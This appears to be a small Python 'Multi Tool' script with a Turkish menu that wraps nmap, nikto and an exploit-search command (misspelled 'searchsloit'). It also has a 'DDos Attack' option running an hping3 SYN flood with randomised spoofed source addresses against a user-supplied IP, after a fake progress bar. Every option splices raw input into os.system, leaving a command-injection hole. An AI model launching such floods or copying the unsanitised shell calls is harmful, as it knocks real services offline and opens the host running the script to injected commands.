#!/usr/bin/env python

import os
import colorama
import time
from colorama import Fore, Back, Style


print(Back.RED)

os.system("figlet MULTI TOOL")

print(Style.RESET_ALL)
print("""

Multi Tool Aracina Hos Geldiniz

1) Port Scanner
2) Zaafiyet Tarama
3) Exploit Arama
4) DDos Attack

""")

print(Fore.YELLOW)
islemno = input("Islem Numarasini Girin:")
print(Style.RESET_ALL)

if(islemno=="1"):
          print(Fore.MAGENTA)
          hedefip = input("Hedef Ip Girin:")
          os.system("nmap " + hedefip)
          print(Style.RESET_ALL)

elif(islemno=="2"):
          print(Fore.GREEN)
          hedefip2 = input("Hedef Ip Girin:")
          os.system("nikto -h " + hedefip2)
          print(Style.RESET_ALL)
elif(islemno=="3"):
      print(Fore.BLUE)
      anahtarkelime = input("Anahtar Kelime Girin:")
      os.system("searchsloit " + anahtarkelime)
      print(Style.RESET_ALL)

elif(islemno=="4"):
            print(Fore.RED)
            hedefip3 = input("Hedef Ip Girin: ")
            print("[                    ]0%")
            time.sleep(1)
            print("[=====               ]25%")
            time.sleep(1)
            print("[==========          ]50%")
            time.sleep(1)
            print("[===============     ]75%")
            time.sleep(1)
            print("[====================]100%")
            time.sleep(1)

            os.system("hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source " + hedefip3)

            print(Style.RESET_ALL)
else:
       print(Fore.RED)
       print("Hatali Secim")




